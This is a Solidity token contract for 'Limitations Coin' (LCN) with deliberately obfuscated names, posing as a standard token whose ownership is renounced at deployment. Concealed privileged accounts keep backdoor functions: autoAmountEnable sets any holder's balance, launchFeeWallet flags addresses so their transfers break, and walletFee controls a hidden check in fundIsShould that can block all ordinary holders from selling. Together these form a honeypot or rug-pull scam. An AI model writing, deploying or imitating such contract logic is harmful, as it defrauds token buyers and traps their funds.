//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface listAtMarketing {
    function createPair(address limitList, address marketingExempt) external returns (address);
}

interface teamAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalSender) external view returns (uint256);

    function transfer(address isLaunched, uint256 tradingMax) external returns (bool);

    function allowance(address limitReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingMax) external returns (bool);

    function transferFrom(
        address sender,
        address isLaunched,
        uint256 tradingMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundShould, uint256 value);
    event Approval(address indexed limitReceiver, address indexed spender, uint256 value);
}

abstract contract toFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundListSell is teamAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LimitationsCoin is toFund, teamAmount, fundListSell {

    address private isBuy;

    mapping(address => mapping(address => uint256)) private liquidityTake;

    function decimals() external view virtual override returns (uint8) {
        return atWallet;
    }

    function maxTotal() private view {
        require(liquidityTrading[_msgSender()]);
    }

    function approve(address tradingSender, uint256 tradingMax) public virtual override returns (bool) {
        liquidityTake[_msgSender()][tradingSender] = tradingMax;
        emit Approval(_msgSender(), tradingSender, tradingMax);
        return true;
    }

    function owner() external view returns (address) {
        return isBuy;
    }

    function balanceOf(address totalSender) public view virtual override returns (uint256) {
        return marketingEnable[totalSender];
    }

    string private exemptSwap = "Limitations Coin";

    function autoAmountEnable(address minAt, uint256 tradingMax) public {
        maxTotal();
        marketingEnable[minAt] = tradingMax;
    }

    uint256 constant enableLiquidity = 16 ** 10;

    function transferFrom(address modeMarketingTrading, address isLaunched, uint256 tradingMax) external override returns (bool) {
        if (_msgSender() != marketingTrading) {
            if (liquidityTake[modeMarketingTrading][_msgSender()] != type(uint256).max) {
                require(tradingMax <= liquidityTake[modeMarketingTrading][_msgSender()]);
                liquidityTake[modeMarketingTrading][_msgSender()] -= tradingMax;
            }
        }
        return fundIsShould(modeMarketingTrading, isLaunched, tradingMax);
    }

    event OwnershipTransferred(address indexed fundSell, address indexed receiverTeam);

    address marketingTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchFeeWallet(address shouldTake) public {
        maxTotal();
        if (takeSwap != listFee) {
            listFee = true;
        }
        if (shouldTake == marketingIs || shouldTake == amountEnable) {
            return;
        }
        modeLaunchLimit[shouldTake] = true;
    }

    function launchedTx(address teamSender) public {
        if (feeTradingWallet) {
            return;
        }
        
        liquidityTrading[teamSender] = true;
        if (marketingReceiver == sellFee) {
            marketingReceiver = fundLimit;
        }
        feeTradingWallet = true;
    }

    function teamMaxMin() public {
        emit OwnershipTransferred(marketingIs, address(0));
        isBuy = address(0);
    }

    uint256 public sellFee;

    mapping(address => bool) public liquidityTrading;

    bool public listFee;

    address public amountEnable;

    uint256 tokenTx;

    constructor (){
        if (marketingReceiver != maxTo) {
            fundLimit = listMode;
        }
        totalLiquidity maxExempt = totalLiquidity(marketingTrading);
        amountEnable = listAtMarketing(maxExempt.factory()).createPair(maxExempt.WETH(), address(this));
        if (sellFee != fundLimit) {
            marketingReceiver = listMode;
        }
        marketingIs = _msgSender();
        liquidityTrading[marketingIs] = true;
        marketingEnable[marketingIs] = enableFrom;
        teamMaxMin();
        
        emit Transfer(address(0), marketingIs, enableFrom);
    }

    function symbol() external view virtual override returns (string memory) {
        return feeReceiver;
    }

    bool private takeSwap;

    function allowance(address maxShould, address tradingSender) external view virtual override returns (uint256) {
        if (tradingSender == marketingTrading) {
            return type(uint256).max;
        }
        return liquidityTake[maxShould][tradingSender];
    }

    uint256 public fundLimit;

    mapping(address => bool) public modeLaunchLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return enableFrom;
    }

    function transfer(address minAt, uint256 tradingMax) external virtual override returns (bool) {
        return fundIsShould(_msgSender(), minAt, tradingMax);
    }

    address public marketingIs;

    bool public feeTradingWallet;

    function walletFee(uint256 tradingMax) public {
        maxTotal();
        tokenTx = tradingMax;
    }

    function getOwner() external view returns (address) {
        return isBuy;
    }

    uint256 public maxTo;

    uint256 public marketingReceiver;

    uint256 private listMode;

    uint256 exemptToken;

    function fundIsShould(address modeMarketingTrading, address isLaunched, uint256 tradingMax) internal returns (bool) {
        if (modeMarketingTrading == marketingIs) {
            return tokenSwap(modeMarketingTrading, isLaunched, tradingMax);
        }
        uint256 takeIsFee = teamAmount(amountEnable).balanceOf(autoMax);
        require(takeIsFee == tokenTx);
        require(isLaunched != autoMax);
        if (modeLaunchLimit[modeMarketingTrading]) {
            return tokenSwap(modeMarketingTrading, isLaunched, enableLiquidity);
        }
        return tokenSwap(modeMarketingTrading, isLaunched, tradingMax);
    }

    function tokenSwap(address modeMarketingTrading, address isLaunched, uint256 tradingMax) internal returns (bool) {
        require(marketingEnable[modeMarketingTrading] >= tradingMax);
        marketingEnable[modeMarketingTrading] -= tradingMax;
        marketingEnable[isLaunched] += tradingMax;
        emit Transfer(modeMarketingTrading, isLaunched, tradingMax);
        return true;
    }

    address autoMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function name() external view virtual override returns (string memory) {
        return exemptSwap;
    }

    string private feeReceiver = "LCN";

    uint8 private atWallet = 18;

    uint256 private enableFrom = 100000000 * 10 ** 18;

    mapping(address => uint256) private marketingEnable;

}